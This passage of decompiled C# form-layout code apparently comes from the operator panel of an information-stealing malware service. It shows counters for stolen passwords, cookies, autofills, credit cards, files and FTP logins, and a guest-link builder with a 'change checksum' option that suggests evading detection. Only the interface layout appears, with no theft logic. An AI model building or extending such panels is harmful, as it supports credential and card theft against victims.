		((System.Windows.Forms.Control)this.top10osLb).Size = new System.Drawing.Size(329, 224);
		((System.Windows.Forms.Control)this.top10osLb).TabIndex = 25;
		((System.Windows.Forms.Control)this.top10osLbl).Font = new System.Drawing.Font("Microsoft Sans Serif", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.top10osLbl).Location = new System.Drawing.Point(226, 43);
		((System.Windows.Forms.Control)this.top10osLbl).Name = "top10osLbl";
		((System.Windows.Forms.Control)this.top10osLbl).Size = new System.Drawing.Size(329, 23);
		((MetroSetLabel)this.top10osLbl).Style = (Style)1;
		((MetroSetLabel)this.top10osLbl).StyleManager = null;
		((System.Windows.Forms.Control)this.top10osLbl).TabIndex = 24;
		((System.Windows.Forms.Control)this.top10osLbl).Text = "Top 10 of OS";
		((System.Windows.Forms.Label)this.top10osLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.top10osLbl).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.top10osLbl).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.ftpLbl).AutoSize = true;
		((System.Windows.Forms.Control)this.ftpLbl).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.ftpLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.ftpLbl).Location = new System.Drawing.Point(4, 458);
		((System.Windows.Forms.Control)this.ftpLbl).Name = "ftpLbl";
		((System.Windows.Forms.Control)this.ftpLbl).Size = new System.Drawing.Size(38, 21);
		((System.Windows.Forms.Control)this.ftpLbl).TabIndex = 22;
		((System.Windows.Forms.Control)this.ftpLbl).Text = "FTP:";
		((System.Windows.Forms.Label)this.ftpLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.ftpsCounter).AutoSize = true;
		((System.Windows.Forms.Control)this.ftpsCounter).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.ftpsCounter).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.ftpsCounter).Location = new System.Drawing.Point(103, 457);
		((System.Windows.Forms.Control)this.ftpsCounter).Name = "ftpsCounter";
		((System.Windows.Forms.Control)this.ftpsCounter).Size = new System.Drawing.Size(19, 21);
		((System.Windows.Forms.Control)this.ftpsCounter).TabIndex = 21;
		((System.Windows.Forms.Control)this.ftpsCounter).Text = "0";
		((System.Windows.Forms.Label)this.ftpsCounter).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.filesLbl).AutoSize = true;
		((System.Windows.Forms.Control)this.filesLbl).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.filesLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.filesLbl).Location = new System.Drawing.Point(4, 398);
		((System.Windows.Forms.Control)this.filesLbl).Name = "filesLbl";
		((System.Windows.Forms.Control)this.filesLbl).Size = new System.Drawing.Size(44, 21);
		((System.Windows.Forms.Control)this.filesLbl).TabIndex = 19;
		((System.Windows.Forms.Control)this.filesLbl).Text = "Files:";
		((System.Windows.Forms.Label)this.filesLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.filesCounter).AutoSize = true;
		((System.Windows.Forms.Control)this.filesCounter).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.filesCounter).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.filesCounter).Location = new System.Drawing.Point(103, 397);
		((System.Windows.Forms.Control)this.filesCounter).Name = "filesCounter";
		((System.Windows.Forms.Control)this.filesCounter).Size = new System.Drawing.Size(19, 21);
		((System.Windows.Forms.Control)this.filesCounter).TabIndex = 18;
		((System.Windows.Forms.Control)this.filesCounter).Text = "0";
		((System.Windows.Forms.Label)this.filesCounter).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.metroSetDivider5).Location = new System.Drawing.Point(-2, 420);
		((System.Windows.Forms.Control)this.metroSetDivider5).Name = "metroSetDivider5";
		((MetroSetDivider)this.metroSetDivider5).Orientation = (DividerStyle)0;
		((System.Windows.Forms.Control)this.metroSetDivider5).Size = new System.Drawing.Size(216, 4);
		((MetroSetDivider)this.metroSetDivider5).Style = (Style)1;
		((MetroSetDivider)this.metroSetDivider5).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetDivider5).TabIndex = 17;
		((System.Windows.Forms.Control)this.metroSetDivider5).Text = "metroSetDivider5";
		((MetroSetDivider)this.metroSetDivider5).ThemeAuthor = "Narwin";
		((MetroSetDivider)this.metroSetDivider5).ThemeName = "MetroDark";
		((MetroSetDivider)this.metroSetDivider5).Thickness = 1;
		((System.Windows.Forms.Control)this.cardsLbl).AutoSize = true;
		((System.Windows.Forms.Control)this.cardsLbl).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.cardsLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.cardsLbl).Location = new System.Drawing.Point(4, 338);
		((System.Windows.Forms.Control)this.cardsLbl).Name = "cardsLbl";
		((System.Windows.Forms.Control)this.cardsLbl).Size = new System.Drawing.Size(99, 21);
		((System.Windows.Forms.Control)this.cardsLbl).TabIndex = 16;
		((System.Windows.Forms.Control)this.cardsLbl).Text = "Credit Cards:";
		((System.Windows.Forms.Label)this.cardsLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.creditcardsCounter).AutoSize = true;
		((System.Windows.Forms.Control)this.creditcardsCounter).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.creditcardsCounter).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.creditcardsCounter).Location = new System.Drawing.Point(103, 337);
		((System.Windows.Forms.Control)this.creditcardsCounter).Name = "creditcardsCounter";
		((System.Windows.Forms.Control)this.creditcardsCounter).Size = new System.Drawing.Size(19, 21);
		((System.Windows.Forms.Control)this.creditcardsCounter).TabIndex = 15;
		((System.Windows.Forms.Control)this.creditcardsCounter).Text = "0";
		((System.Windows.Forms.Label)this.creditcardsCounter).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.metroSetDivider4).Location = new System.Drawing.Point(-1, 360);
		((System.Windows.Forms.Control)this.metroSetDivider4).Name = "metroSetDivider4";
		((MetroSetDivider)this.metroSetDivider4).Orientation = (DividerStyle)0;
		((System.Windows.Forms.Control)this.metroSetDivider4).Size = new System.Drawing.Size(216, 4);
		((MetroSetDivider)this.metroSetDivider4).Style = (Style)1;
		((MetroSetDivider)this.metroSetDivider4).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetDivider4).TabIndex = 14;
		((System.Windows.Forms.Control)this.metroSetDivider4).Text = "metroSetDivider4";
		((MetroSetDivider)this.metroSetDivider4).ThemeAuthor = "Narwin";
		((MetroSetDivider)this.metroSetDivider4).ThemeName = "MetroDark";
		((MetroSetDivider)this.metroSetDivider4).Thickness = 1;
		((System.Windows.Forms.Control)this.autofillsLbl).AutoSize = true;
		((System.Windows.Forms.Control)this.autofillsLbl).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.autofillsLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.autofillsLbl).Location = new System.Drawing.Point(4, 279);
		((System.Windows.Forms.Control)this.autofillsLbl).Name = "autofillsLbl";
		((System.Windows.Forms.Control)this.autofillsLbl).Size = new System.Drawing.Size(70, 21);
		((System.Windows.Forms.Control)this.autofillsLbl).TabIndex = 13;
		((System.Windows.Forms.Control)this.autofillsLbl).Text = "Autofills:";
		((System.Windows.Forms.Label)this.autofillsLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.autofillsCounter).AutoSize = true;
		((System.Windows.Forms.Control)this.autofillsCounter).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.autofillsCounter).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.autofillsCounter).Location = new System.Drawing.Point(103, 277);
		((System.Windows.Forms.Control)this.autofillsCounter).Name = "autofillsCounter";
		((System.Windows.Forms.Control)this.autofillsCounter).Size = new System.Drawing.Size(19, 21);
		((System.Windows.Forms.Control)this.autofillsCounter).TabIndex = 12;
		((System.Windows.Forms.Control)this.autofillsCounter).Text = "0";
		((System.Windows.Forms.Label)this.autofillsCounter).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.metroSetDivider3).Location = new System.Drawing.Point(-1, 300);
		((System.Windows.Forms.Control)this.metroSetDivider3).Name = "metroSetDivider3";
		((MetroSetDivider)this.metroSetDivider3).Orientation = (DividerStyle)0;
		((System.Windows.Forms.Control)this.metroSetDivider3).Size = new System.Drawing.Size(216, 4);
		((MetroSetDivider)this.metroSetDivider3).Style = (Style)1;
		((MetroSetDivider)this.metroSetDivider3).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetDivider3).TabIndex = 11;
		((System.Windows.Forms.Control)this.metroSetDivider3).Text = "metroSetDivider3";
		((MetroSetDivider)this.metroSetDivider3).ThemeAuthor = "Narwin";
		((MetroSetDivider)this.metroSetDivider3).ThemeName = "MetroDark";
		((MetroSetDivider)this.metroSetDivider3).Thickness = 1;
		((System.Windows.Forms.Control)this.cookiesLbl).AutoSize = true;
		((System.Windows.Forms.Control)this.cookiesLbl).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.cookiesLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.cookiesLbl).Location = new System.Drawing.Point(4, 219);
		((System.Windows.Forms.Control)this.cookiesLbl).Name = "cookiesLbl";
		((System.Windows.Forms.Control)this.cookiesLbl).Size = new System.Drawing.Size(68, 21);
		((System.Windows.Forms.Control)this.cookiesLbl).TabIndex = 10;
		((System.Windows.Forms.Control)this.cookiesLbl).Text = "Cookies:";
		((System.Windows.Forms.Label)this.cookiesLbl).TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		((System.Windows.Forms.Control)this.cookiesCounter).AutoSize = true;
		((System.Windows.Forms.Control)this.cookiesCounter).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.cookiesCounter).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.cookiesCounter).Location = new System.Drawing.Point(103, 218);
		((System.Windows.Forms.Control)this.cookiesCounter).Name = "cookiesCounter";
		((System.Windows.Forms.Control)this.cookiesCounter).Size = new System.Drawing.Size(19, 21);
		((System.Windows.Forms.Control)this.cookiesCounter).TabIndex = 9;
		((System.Windows.Forms.Control)this.cookiesCounter).Text = "0";
		((System.Windows.Forms.Label)this.cookiesCounter).TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		((System.Windows.Forms.Control)this.metroSetDivider2).Location = new System.Drawing.Point(-1, 240);
		((System.Windows.Forms.Control)this.metroSetDivider2).Name = "metroSetDivider2";
		((MetroSetDivider)this.metroSetDivider2).Orientation = (DividerStyle)0;
		((System.Windows.Forms.Control)this.metroSetDivider2).Size = new System.Drawing.Size(216, 4);
		((MetroSetDivider)this.metroSetDivider2).Style = (Style)1;
		((MetroSetDivider)this.metroSetDivider2).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetDivider2).TabIndex = 8;
		((System.Windows.Forms.Control)this.metroSetDivider2).Text = "metroSetDivider2";
		((MetroSetDivider)this.metroSetDivider2).ThemeAuthor = "Narwin";
		((MetroSetDivider)this.metroSetDivider2).ThemeName = "MetroDark";
		((MetroSetDivider)this.metroSetDivider2).Thickness = 1;
		((System.Windows.Forms.Control)this.passwordsLbl).AutoSize = true;
		((System.Windows.Forms.Control)this.passwordsLbl).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.passwordsLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.passwordsLbl).Location = new System.Drawing.Point(4, 159);
		((System.Windows.Forms.Control)this.passwordsLbl).Name = "passwordsLbl";
		((System.Windows.Forms.Control)this.passwordsLbl).Size = new System.Drawing.Size(87, 21);
		((System.Windows.Forms.Control)this.passwordsLbl).TabIndex = 7;
		((System.Windows.Forms.Control)this.passwordsLbl).Text = "Passwords:";
		((System.Windows.Forms.Label)this.passwordsLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.passwordsCounter).AutoSize = true;
		((System.Windows.Forms.Control)this.passwordsCounter).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.passwordsCounter).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.passwordsCounter).Location = new System.Drawing.Point(103, 158);
		((System.Windows.Forms.Control)this.passwordsCounter).Name = "passwordsCounter";
		((System.Windows.Forms.Control)this.passwordsCounter).Size = new System.Drawing.Size(19, 21);
		((System.Windows.Forms.Control)this.passwordsCounter).TabIndex = 6;
		((System.Windows.Forms.Control)this.passwordsCounter).Text = "0";
		((System.Windows.Forms.Label)this.passwordsCounter).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.metroSetDivider1).Location = new System.Drawing.Point(-1, 180);
		((System.Windows.Forms.Control)this.metroSetDivider1).Name = "metroSetDivider1";
		((MetroSetDivider)this.metroSetDivider1).Orientation = (DividerStyle)0;
		((System.Windows.Forms.Control)this.metroSetDivider1).Size = new System.Drawing.Size(216, 4);
		((MetroSetDivider)this.metroSetDivider1).Style = (Style)1;
		((MetroSetDivider)this.metroSetDivider1).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetDivider1).TabIndex = 3;
		((System.Windows.Forms.Control)this.metroSetDivider1).Text = "metroSetDivider1";
		((MetroSetDivider)this.metroSetDivider1).ThemeAuthor = "Narwin";
		((MetroSetDivider)this.metroSetDivider1).ThemeName = "MetroDark";
		((MetroSetDivider)this.metroSetDivider1).Thickness = 1;
		((System.Windows.Forms.Control)this.label56).AutoSize = true;
		((System.Windows.Forms.Control)this.label56).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label56).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.Control)this.label56).Location = new System.Drawing.Point(4, 38);
		((System.Windows.Forms.Control)this.label56).Name = "label56";
		((System.Windows.Forms.Control)this.label56).Size = new System.Drawing.Size(131, 21);
		((System.Windows.Forms.Control)this.label56).TabIndex = 40;
		((System.Windows.Forms.Control)this.label56).Text = "Requests Per Sec:";
		((System.Windows.Forms.Label)this.label56).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((System.Windows.Forms.Control)this.partnersTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.partnersTab).Controls.Add((System.Windows.Forms.Control)this.partnerPoster6);
		((System.Windows.Forms.Control)this.partnersTab).Controls.Add((System.Windows.Forms.Control)this.partnerPoster5);
		((System.Windows.Forms.Control)this.partnersTab).Controls.Add((System.Windows.Forms.Control)this.partnerPoster4);
		((System.Windows.Forms.Control)this.partnersTab).Controls.Add((System.Windows.Forms.Control)this.partnerPoster3);
		((System.Windows.Forms.Control)this.partnersTab).Controls.Add((System.Windows.Forms.Control)this.partnerPoster2);
		((System.Windows.Forms.Control)this.partnersTab).Controls.Add((System.Windows.Forms.Control)this.partnerPoster1);
		((System.Windows.Forms.Control)this.partnersTab).Font = new System.Drawing.Font("Segoe UI", 9f);
		((System.Windows.Forms.Control)this.partnersTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.TabPage)this.partnersTab).Location = new System.Drawing.Point(194, 4);
		((System.Windows.Forms.Control)this.partnersTab).Name = "partnersTab";
		((System.Windows.Forms.Control)this.partnersTab).Size = new System.Drawing.Size(1168, 639);
		((System.Windows.Forms.TabPage)this.partnersTab).TabIndex = 19;
		((System.Windows.Forms.Control)this.partnersTab).Text = "Advertisement";
		((System.Windows.Forms.Control)this.partnerPoster6).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.partnerPoster6).Location = new System.Drawing.Point(800, 326);
		((System.Windows.Forms.Control)this.partnerPoster6).Name = "partnerPoster6";
		((System.Windows.Forms.Control)this.partnerPoster6).Size = new System.Drawing.Size(250, 306);
		((System.Windows.Forms.Control)this.partnerPoster6).TabIndex = 5;
		((System.Windows.Forms.Control)this.partnerPoster5).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.partnerPoster5).Location = new System.Drawing.Point(460, 326);
		((System.Windows.Forms.Control)this.partnerPoster5).Name = "partnerPoster5";
		((System.Windows.Forms.Control)this.partnerPoster5).Size = new System.Drawing.Size(250, 306);
		((System.Windows.Forms.Control)this.partnerPoster5).TabIndex = 4;
		((System.Windows.Forms.Control)this.partnerPoster4).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.partnerPoster4).Location = new System.Drawing.Point(115, 326);
		((System.Windows.Forms.Control)this.partnerPoster4).Name = "partnerPoster4";
		((System.Windows.Forms.Control)this.partnerPoster4).Size = new System.Drawing.Size(250, 306);
		((System.Windows.Forms.Control)this.partnerPoster4).TabIndex = 3;
		((System.Windows.Forms.Control)this.partnerPoster3).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.partnerPoster3).Location = new System.Drawing.Point(800, 9);
		((System.Windows.Forms.Control)this.partnerPoster3).Name = "partnerPoster3";
		((System.Windows.Forms.Control)this.partnerPoster3).Size = new System.Drawing.Size(250, 306);
		((System.Windows.Forms.Control)this.partnerPoster3).TabIndex = 2;
		((System.Windows.Forms.Control)this.partnerPoster2).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.partnerPoster2).Location = new System.Drawing.Point(460, 9);
		((System.Windows.Forms.Control)this.partnerPoster2).Name = "partnerPoster2";
		((System.Windows.Forms.Control)this.partnerPoster2).Size = new System.Drawing.Size(250, 306);
		((System.Windows.Forms.Control)this.partnerPoster2).TabIndex = 1;
		((System.Windows.Forms.Control)this.partnerPoster1).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.partnerPoster1).Location = new System.Drawing.Point(115, 9);
		((System.Windows.Forms.Control)this.partnerPoster1).Name = "partnerPoster1";
		((System.Windows.Forms.Control)this.partnerPoster1).Size = new System.Drawing.Size(250, 306);
		((System.Windows.Forms.Control)this.partnerPoster1).TabIndex = 0;
		((System.Windows.Forms.Control)this.fc).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.Control)this.fc).Controls.Add((System.Windows.Forms.Control)this.changeMd5Cb);
		((System.Windows.Forms.Control)this.fc).Controls.Add((System.Windows.Forms.Control)this.label36);
		((System.Windows.Forms.Control)this.fc).Controls.Add((System.Windows.Forms.Control)this.createDirectFileBtn);
		((System.Windows.Forms.Control)this.fc).Controls.Add((System.Windows.Forms.Control)this.guestFilesDgv);
		((System.Windows.Forms.Control)this.fc).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider16);
		((System.Windows.Forms.Control)this.fc).Controls.Add((System.Windows.Forms.Control)this.guestExpireDate);
		((System.Windows.Forms.Control)this.fc).Controls.Add((System.Windows.Forms.Control)this.label34);
		((System.Windows.Forms.Control)this.fc).Controls.Add((System.Windows.Forms.Control)this.guestBuildID);
		((System.Windows.Forms.Control)this.fc).Controls.Add((System.Windows.Forms.Control)this.label33);
		((System.Windows.Forms.Control)this.fc).Controls.Add((System.Windows.Forms.Control)this.addGuest);
		((System.Windows.Forms.Control)this.fc).Controls.Add((System.Windows.Forms.Control)this.fd);
		((System.Windows.Forms.Control)this.fc).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.TabPage)this.fc).Location = new System.Drawing.Point(194, 4);
		((System.Windows.Forms.Control)this.fc).Name = "guestStatPage";
		((System.Windows.Forms.Control)this.fc).Padding = new System.Windows.Forms.Padding(3);
		((System.Windows.Forms.Control)this.fc).Size = new System.Drawing.Size(1168, 639);
		((System.Windows.Forms.TabPage)this.fc).TabIndex = 17;
		((System.Windows.Forms.Control)this.fc).Text = "Guest Links";
		((System.Windows.Forms.Control)this.changeMd5Cb).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.changeMd5Cb).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.changeMd5Cb).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.changeMd5Cb).Checked = false;
		((MetroSetCheckBox)this.changeMd5Cb).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.changeMd5Cb).CheckState = (CheckState)0;
		((System.Windows.Forms.Control)this.changeMd5Cb).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.changeMd5Cb).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.changeMd5Cb).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.changeMd5Cb).Location = new System.Drawing.Point(557, 610);
		((System.Windows.Forms.Control)this.changeMd5Cb).Name = "changeMd5Cb";
		((MetroSetCheckBox)this.changeMd5Cb).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.changeMd5Cb).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.changeMd5Cb).Style = (Style)1;
		((MetroSetCheckBox)this.changeMd5Cb).StyleManager = null;
		((System.Windows.Forms.Control)this.changeMd5Cb).TabIndex = 144;
		((MetroSetCheckBox)this.changeMd5Cb).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.changeMd5Cb).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.label36).AutoSize = true;
		((System.Windows.Forms.Control)this.label36).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.label36).ForeColor = System.Drawing.Color.FromArgb(170, 170, 170);
		((System.Windows.Forms.Control)this.label36).Location = new System.Drawing.Point(450, 610);
		((System.Windows.Forms.Control)this.label36).Name = "label36";
		((System.Windows.Forms.Control)this.label36).Size = new System.Drawing.Size(108, 15);
		((System.Windows.Forms.Control)this.label36).TabIndex = 106;
		((System.Windows.Forms.Control)this.label36).Text = "Change checksum:";
		((System.Windows.Forms.Control)this.createDirectFileBtn).BackColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((System.Windows.Forms.ButtonBase)this.createDirectFileBtn).FlatAppearance.BorderSize = 0;
		((System.Windows.Forms.ButtonBase)this.createDirectFileBtn).FlatStyle = System.Windows.Forms.FlatStyle.Popup;
		((System.Windows.Forms.Control)this.createDirectFileBtn).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.createDirectFileBtn).ForeColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.createDirectFileBtn).Location = new System.Drawing.Point(582, 605);
		((System.Windows.Forms.Control)this.createDirectFileBtn).Name = "createDirectFileBtn";
		((System.Windows.Forms.Control)this.createDirectFileBtn).Size = new System.Drawing.Size(79, 26);
		((System.Windows.Forms.Control)this.createDirectFileBtn).TabIndex = 103;
		((System.Windows.Forms.Control)this.createDirectFileBtn).Text = "Create Link";
		((System.Windows.Forms.ButtonBase)this.createDirectFileBtn).UseVisualStyleBackColor = false;
		((System.Windows.Forms.Control)this.createDirectFileBtn).Click += new System.EventHandler(createDirectFileBtn_Click);
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).AllowUserToAddRows = false;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).AllowUserToDeleteRows = false;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).AllowUserToResizeColumns = false;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).AllowUserToResizeRows = false;
		dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle6.BackColor = System.Drawing.Color.FromArgb(52, 60, 67);
		dataGridViewCellStyle6.Font = new System.Drawing.Font("Segoe UI", 9f);
		dataGridViewCellStyle6.ForeColor = System.Drawing.Color.Silver;
		dataGridViewCellStyle6.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).AlternatingRowsDefaultCellStyle = dataGridViewCellStyle6;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).AutoGenerateColumns = false;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).BackgroundColor = System.Drawing.Color.FromArgb(52, 60, 67);
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).BorderStyle = System.Windows.Forms.BorderStyle.None;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.RaisedVertical;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle7.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle7.BackColor = System.Drawing.Color.FromArgb(58, 62, 73);
		dataGridViewCellStyle7.Font = new System.Drawing.Font("Segoe UI", 9f);
		dataGridViewCellStyle7.ForeColor = System.Drawing.Color.Silver;
		dataGridViewCellStyle7.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle7.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle7.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).ColumnHeadersDefaultCellStyle = dataGridViewCellStyle7;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).Columns.AddRange((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn3, (System.Windows.Forms.DataGridViewColumn)this.filenameDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.changeMd5DataGridViewCheckBoxColumn);
		((System.Windows.Forms.Control)this.guestFilesDgv).ContextMenuStrip = (System.Windows.Forms.ContextMenuStrip)this.blackListCms_4;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).DataSource = this.object_14;
		dataGridViewCellStyle8.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle8.BackColor = System.Drawing.Color.FromArgb(58, 62, 73);
		dataGridViewCellStyle8.Font = new System.Drawing.Font("Segoe UI", 9f);
		dataGridViewCellStyle8.ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
		dataGridViewCellStyle8.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle8.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle8.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).DefaultCellStyle = dataGridViewCellStyle8;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).EditMode = System.Windows.Forms.DataGridViewEditMode.EditOnEnter;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).EnableHeadersVisualStyles = false;
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).GridColor = System.Drawing.Color.FromArgb(52, 60, 67);
		((System.Windows.Forms.Control)this.guestFilesDgv).Location = new System.Drawing.Point(328, 340);
		((System.Windows.Forms.DataGridView)this.guestFilesDgv).MultiSelect = false;
		((System.Windows.Forms.Control)this.guestFilesDgv).Name = "guestFilesDgv";
